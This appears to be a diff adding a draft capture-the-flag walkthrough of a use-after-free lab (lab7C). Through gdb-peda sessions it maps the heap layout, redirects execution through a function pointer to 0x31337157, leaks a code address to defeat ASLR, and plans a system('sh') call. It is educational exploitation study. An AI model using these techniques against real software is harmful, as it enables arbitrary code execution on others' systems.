@@ -1,0 +1,508 @@
+   
+We already know what we are gonna do:
+
+1) make a number
+2) delete the number
+3) make a string (overwriting what was left after the just-freed number
+4) call print number on the memory range now occupied by the string
+
+<add the static analysis part here, draw that diagram> 
+We're gonna do a first crash:
+
+
+OK, let's debug this more conveniently. First, a breakpoint at the menu loop:
+
+gdb-peda$ b *(main+174)
+Breakpoint 1 at 0xdf3
+
+0x00000dee <+169>:   call   0xd03 <print_menu>
+0x00000df3 <+174>:   call   0xb29 <get_unum>
+
+
+Second, we'll input a string and simply search for it.
+
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0xb75b9000 0xb75ba000 rw-p      mapped
+0xb75ba000 0xb7762000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7762000 0xb7764000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7764000 0xb7765000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7765000 0xb7768000 rw-p      mapped
+0xb776f000 0xb7772000 rw-p      mapped
+0xb7772000 0xb7773000 r-xp      [vdso]
+0xb7773000 0xb7775000 r--p      [vvar]
+0xb7775000 0xb7795000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7795000 0xb7796000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7796000 0xb7797000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7797000 0xb7799000 r-xp      /levels/lab07/lab7C
+0xb7799000 0xb779a000 r--p      /levels/lab07/lab7C
+0xb779a000 0xb779b000 rw-p      /levels/lab07/lab7C
+0xbfd35000 0xbfd56000 rw-p      [stack]
+
+gdb-peda$ c
+Continuing.
+Enter Choice: 1
+Input string to store: AAAAAAAAAABBBBBBBBB
+Created new string!
+
+
+gdb-peda$ searchmem AAAA 0xb7765000 0xb7768000
+Searching for 'AAAA' in range: 0xb7765000 - 0xb7768000
+Not found
+gdb-peda$ searchmem AAAA 0xb776f000 0xb7772000
+Searching for 'AAAA' in range: 0xb776f000 - 0xb7772000
+Not found
+gdb-peda$ searchmem AAAA 0xb7773000 0xb7775000
+Searching for 'AAAA' in range: 0xb7773000 - 0xb7775000
+Not found
+
+Mhm. Let's see vmmap again:
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0xb75b9000 0xb75ba000 rw-p      mapped
+0xb75ba000 0xb7762000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7762000 0xb7764000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7764000 0xb7765000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7765000 0xb7768000 rw-p      mapped
+0xb776e000 0xb7772000 rw-p      mapped
+0xb7772000 0xb7773000 r-xp      [vdso]
+0xb7773000 0xb7775000 r--p      [vvar]
+0xb7775000 0xb7795000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7795000 0xb7796000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7796000 0xb7797000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7797000 0xb7799000 r-xp      /levels/lab07/lab7C
+0xb7799000 0xb779a000 r--p      /levels/lab07/lab7C
+0xb779a000 0xb779b000 rw-p      /levels/lab07/lab7C
+0xb8bfe000 0xb8c1f000 rw-p      [heap]		<-- AHA!
+0xbfd35000 0xbfd56000 rw-p      [stack]
+
+So the heap segment got mapped after the first malloc() call. Fair enough.
+
+gdb-peda$ searchmem AAAA 0xb8bfe000 0xb8c1f000
+Searching for 'AAAA' in range: 0xb8bfe000 - 0xb8c1f000
+Found 2 results, display max 2 items:
+[heap] : 0xb8bfe010 ("AAAAAAAAAABBBBBBBBB")
+[heap] : 0xb8bfe014 ("AAAAAABBBBBBBBB")
+
+Okie dokie.
+
+gdb-peda$ x/100wx 0xb8bfe010
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0x00424242      0xb7797c16      0x00000000      0x00020fd9
+0xb8bfe030:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe040:     0x00000000      0x00000000      0x00000000      0x00000000
+
+OK. But we know the structure goes like this:
+
+struct data {
+    char reserved[8];
+    char buffer[20];
+    void (* print)(char *);
+};
+
+And that the heap starts at 0xb8bfe000. So let's print from there:
+
+gdb-peda$ x/100wx 0xb8bfe000
+0xb8bfe000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0x00424242      0xb7797c16      0x00000000      0x00020fd9
+0xb8bfe030:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe040:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe050:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe060:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe070:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe090:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8bfe0a0:     0x00000000      0x00000000      0x00000000      0x00000000
+
+OK. It seems these first eight bytes:
+gdb-peda$ x/2wx 0xb8bfe000
+0xb8bfe000:     0x00000000      0x00000029
+
+are the malloc chunk metadata. 
+
+Next eight bytes are the 'reserved' field:
+
+gdb-peda$ x/2wx 0xb8bfe008
+0xb8bfe008:     0x00000000      0x00000000
+
+Then there's 20 bytes of the buffer we filled with A-s and B-s (19 characters plus the nullbyte):
+
+gdb-peda$ x/5wx 0xb8bfe010
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0x00424242
+
+And lastly, there's the "void (* print)(char *);" pointer, pointing at the big_str function:
+
+gdb-peda$ x/1wx 0xb8bfe024
+0xb8bfe024:     0xb7797c16
+
+gdb-peda$ x 0xb7797c16
+0xb7797c16 <big_str>:   0x53e58955
+
+And lastly, this, also looking like malloc()'s metadata:
+gdb-peda$  x/1wx 0xb8bfe02c
+0xb8bfe02c:     0x00020fd9
+OK, now let's see what happens once we 'delete' this string.
+
+gdb-peda$ c
+Continuing.
+Enter Choice: 3
+Deleted most recent string!
+
+
+As we can see, everything on the heap is intact:
+
+Breakpoint 1, 0xb7797df3 in main ()
+gdb-peda$ x/100wx 0xb8bfe000
+0xb8bfe000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0x00424242      0xb7797c16      0x00000000      0x00020fd9
+0xb8bfe030:     0x00000000      0x00000000      0x00000000      0x00000000
+
+OK, now let's try to print a number (which we did not create) and see what happens (my expectation is a segfault, as the last two least significant bytes of the 'reserved' field in the string will be treated as a function pointer, along with the first two A-s, effectively calling 0x00004141, which is not within the address space).
+
+Let's see:
+
+gdb-peda$ c
+Continuing.
+Enter Choice: 6
+Number index to print: 1
+There is no number to print!
+
+Huh. Right, this is because the number's not been initialized. Fair enough.
+
+We have to do it the other way. First declare a number, then delete it, then create a string, then call a number.
+
+We want to put C-s in that number, to spot it easier:
+/mnt/c/Users/ewilded$ printf "%d" 0x43434343
+1128481603linux@DESKTOP-C7SN3L7:/mnt/c/Users/ewilded$
+
+Continuing.
+Enter Choice: 2
+Input number to store: 1128481603
+Created new number!
+
+OK, let's see the heap:
+gdb-peda$  x/100wx 0xb8bfe000
+
+0xb8bfe000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0xb7797cb4      0x43434343      0x00000000      0x00020fd9
+
+Now, compare it with the heap when we had the string on it:
+
+gdb-peda$ x/100wx 0xb8bfe000
+0xb8bfe000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8bfe010:     0x41414141      0x41414141      0x42424141      0x42424242
+0xb8bfe020:     0x00424242      0xb7797c16      0x00000000      0x00020fd9
+
+So, 0xb8bfe020 currently contains the 0xb7797cb4 (big_num() address), while previously it was the end of our buffer. 
+
+Apparently the buffer is filled with numbers from the other direction than I expected. OK, let's add another one.
+
+This time E-s:
+
+gdb-peda$ c
+Continuing.
+Enter Choice: 2
+Input number to store: 1162167621
+Created new number!
+
+
+And:
+
+gdb-peda$  x/100wx 0xb8bfe000
+0xb8bfe000:     0x00000000      0x00000029      				0x00000000      0x00000000
+0xb8bfe010:     0x41414141      0x41414141      				0x42424141      0x42424242
+0xb8bfe020:     0xb7797cb4      0x43434343   <-- first number   0x00000000      0x00000029 
+0xb8bfe030:     0x00000000      0x00000000      				0x00000000      0x00000000
+0xb8bfe040:     0x00000000      0x00000000      				0xb7797cb4      0x45454545  <-- second number
+0xb8bfe050:     0x00000000      0x00020fb1   <-- malloc meta    0x00000000      0x00000000
+0xb8bfe060:     0x00000000      0x00000000      				0x00000000      0x00000000
+
+I get there are six bytes for the 'reserved' thing in the number structure, which makes it effectively 8 (padding to multiple of four).
+
+
+
+OK, let's restart the program and observe this again. Create three numbers.
+
+gdb-peda$ b *(main+169)
+Breakpoint 1 at 0xdee
+
+1094795585
+1111638594
+1128481603
+
+First:
+gdb-peda$ x/100wx 0xb8611000
+0xb8611000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8611010:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611020:     0xb770ccb4      0x41414141      0x00000000      0x00020fd9
+0xb8611030:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611040:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611050:     0x00000000      0x00000000      0x00000000      0x00000000
+
+Second:
+gdb-peda$ x/100wx 0xb8611000
+0xb8611000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8611010:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611020:     0xb770ccb4      0x41414141      0x00000000      0x00000029
+0xb8611030:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611040:     0x00000000      0x00000000      0xb770ccb4      0x42424242
+0xb8611050:     0x00000000      0x00020fb1      0x00000000      0x00000000
+0xb8611060:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611070:     0x00000000      0x00000000      0x00000000      0x00000000
+
+Third:
+
+gdb-peda$ x/100wx 0xb8611000
+0xb8611000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8611010:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611020:     0xb770ccb4      0x41414141      0x00000000      0x00000029
+0xb8611030:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611040:     0x00000000      0x00000000      0xb770ccb4      0x42424242
+0xb8611050:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8611060:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611070:     0xb770ccb4      0x43434343      0x00000000      0x00020f89
+0xb8611080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8611090:     0x00000000      0x00000000      0x00000000      0x00000000
+
+OK. It's seems malloc() is padding those strctures to 32 bytes anyway.
+
+Now let's see how strings get aligned.
+
+And here's the (new, after a restart) heap with three strings added (AAAAAAAAAAAAAAAAAAA, BBBBBBBBBBBBBBBBBBB, CCCCCCCCCCCCCCCCCCC):
+
+gdb-peda$ x/100wx 0xb8559000
+0xb8559000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8559010:     0x41414141      0x41414141      0x41414141      0x41414141
+0xb8559020:     0x00414141      0xb774dc16      0x00000000      0x00000029
+0xb8559030:     0x00000000      0x00000000      0x42424242      0x42424242
+0xb8559040:     0x42424242      0x42424242      0x00424242      0xb774dc16
+0xb8559050:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb8559060:     0x43434343      0x43434343      0x43434343      0x43434343
+0xb8559070:     0x00434343      0xb774dc16      0x00000000      0x00020f89
+0xb8559080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb8559090:     0x00000000      0x00000000      0x00000000      0x00000000
+
+So yeah. Three 32-byte 'data' structures took the same space on the heap as three 16-byte 'number' structures. Exactly the same.
+
+Either way, comparing these two layouts visually made it clear to me how to achieve execution control.
+
+We can see that in the number structure, the function pointer occupies the same space that, when alllocated with a string, always contains at least one nullbyte (because the string is automatically null-terminated by fgets and we can't control it). Hence, allocating a number, then deleting it, allocating a string in its place and then requesting the program to print the number won't get us far  (we'll crash the program), as we only control up to three bytes and we are not even overwriting a function pointer, so a partial overwrite won't help us (fgets will always put a null where we want something arbitrary).
+
+At the same time we can see that the space holding the actual number value (which we can control fully as numbers from all ranges are acceptable) sits in the same place as the function pointer for the string structure. Hence, allocating a string, deleting it, creating an arbitrary number and then requesting the string to be printed would effectively lead to the program trying to print the no longer existing string with code pointed by the our newly created number, treating it as a pointer.
+
+Let's try it:
+Continuing.
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 1
+Input string to store: GGGGGGGGGGGGGGGGGGG
+Created new string!
+
+Continuing.
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 3
+Deleted most recent string!
+
+printf "%d" 0x31337157
+825454935
+
+Enter Choice: 2
+Input number to store: 825454935
+Created new number!
+
+Now, 'print' the string should lead to a segfault at 0x31337157:
+
+Enter Choice: 5
+String index to print: 1
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x31337157 ('Wq31')
+EBX: 0xb774ff98 --> 0x2ea0
+ECX: 0xb771b8a4 --> 0x0
+EDX: 0xb8559010 ('G' <repeats 16 times>, "\264\334t\267Wq31")
+ESI: 0x18
+EDI: 0x0
+EBP: 0xbfd87698 --> 0x0
+ESP: 0xbfd8760c --> 0xb774e071 (<main+812>:     jmp    0xb774e0fb <main+950>)
+EIP: 0x31337157 ('Wq31')
+EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x31337157
+[------------------------------------stack-------------------------------------]
+0000| 0xbfd8760c --> 0xb774e071 (<main+812>:    jmp    0xb774e0fb <main+950>)
+0004| 0xbfd87610 --> 0xb8559010 ('G' <repeats 16 times>, "\264\334t\267Wq31")
+0008| 0xbfd87614 --> 0xb774e357 --> 0x7243000a ('\n')
+0012| 0xbfd87618 --> 0xb771ac20 --> 0xfbad2288
+0016| 0xbfd8761c --> 0xc2
+0020| 0xbfd87620 --> 0x1
+0024| 0xbfd87624 --> 0x0
+0028| 0xbfd87628 --> 0xbfd87734 --> 0xbfd878b8 ("/levels/lab07/lab7C")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x31337157 in ?? ()
+
+Yup. The string itself will be useful to us to control the arguments.
+If we look on the corresponding fields on the heap layout we'll see that first 16 bytes of the string buffer are occupied by the 'reserved' fields in the number structure, which means that if we allocate a number after removing a string, taking the space it was allocated on, the first 16 bytes of the structure (6 bytes 'reserved' and 2 bytes of padding) will be left alone with the old values from the string.
+
+So calling system("sh") should be doable:
+1) create a string "sh"
+2) delete the string
+3) create a number == libc system()'s address
+4) 'print' the string
+
+The only problem we have got left to figure out is how to leak the memory layout.
+
+Looking at the layout again brought me the potential answer to this literally after the first glance (which proves how having visual representation of the memory is a huge help).
+
+As we want to leak memory, we need to call a function taking as argument a piece of memory that happens to store a pointer.
+
+The goal is to see both possible states of the memory combined and find such a combination of values that will let us achieve our goal:
+
+Let's look at the layout again, this time focusing on two particular neighboring double words:
+
+
+When the space is occupied by a number structure, the <base>+0x20 address contains a pointer (the print function), while <base>+0x24 contains data (the number).
+
+Conversely, when the space is occupied by a data structure, the <base>+0x20 address contains data (the last three bytes of the string and its terminating nullbyte), while <base>+0x24 contains a pointer (the print function).
+
+So, what would happen if we allocated a string first (to propagate <base>+0x24 with the function pointer) and then simply requested the program to print a number (without creating it)? Yup it should print the data strcture printing function pointer as number.
+
+The program won't, however, allow us to do it this simple, because of the following condition:
+
+        /* print a number */
+        else if(choice == 6)
+        {
+            printf("Number index to print: ");
+            index = get_unum();
+
+            if(index < MAX_NUM && numbers[index])
+                numbers[index]->print(numbers[index]->num);
+            else
+                printf("There is no number to print!\n");
+        }
+
+The pointer 'numbers[index]' must not be empty (must not be 0). Make no mistake here. NOT the value pointer by the pointer, but the pointer itself. It needs to point at the heap (initially it is 0, as per the initialization here on line 61:     struct number * numbers[MAX_NUM] = {0};).
+
+So, we create a number, then we remove it (so the number[index] is not 0, even though the structure it was pointing at was 'removed', which means free()'d).
+Then we create a relatively short (less than 15-characters) string, to avoid fgets() overwriting the last four bytes of the buff[20], because that is where the print number pointer is held and we will want to call it, so it prints out the address of the string print function for us, thus giving us the info needed for crafting the exploit.
+
+Let's try this without debugging too much (just check if the result is correct after performing the actions, using the breakpoint in the main loop):
+b *(main+169)
+
+So:
+
+lab7C@warzone:/levels/lab07$ gdb ./lab7C
+Reading symbols from ./lab7C...(no debugging symbols found)...done.
+gdb-peda$ b *(main+169)
+Breakpoint 1 at 0xdee
+gdb-peda$ c
+Continuing.
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 2
+Input number to store: 3
+Created new number!
+
+...
+Breakpoint 1, 0xb7744dee in main ()
+gdb-peda$ c
+Continuing.
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 4
+Deleted most recent number!
+
+Breakpoint 1, 0xb7744dee in main ()
+gdb-peda$ c
+Continuing.
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 1
+Input string to store: fuck
+Created new string!
+
+...
+
+Breakpoint 1, 0xb7744dee in main ()
+gdb-peda$ c
+Continuing.
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 6
+Number index to print: 1
+not 1337 enough: 3077852103
+
+So, we have a number vomitted out. Let's convert it to a format more readable to us:
+
+$ printf "%x" 3077852103
+b7744bc7
+
+Looks good. Let's confirm in gdb:
+
+gdb-peda$ x/i 0xb7744bc7
+   0xb7744bc7 <small_str>:      push   ebp
+   
+Yup. It's the small_str() function.
+
+Awesome. It looks like we have all the bits and pieces to develop an exploit :D
+
+
+
+
+
+
+
+
+
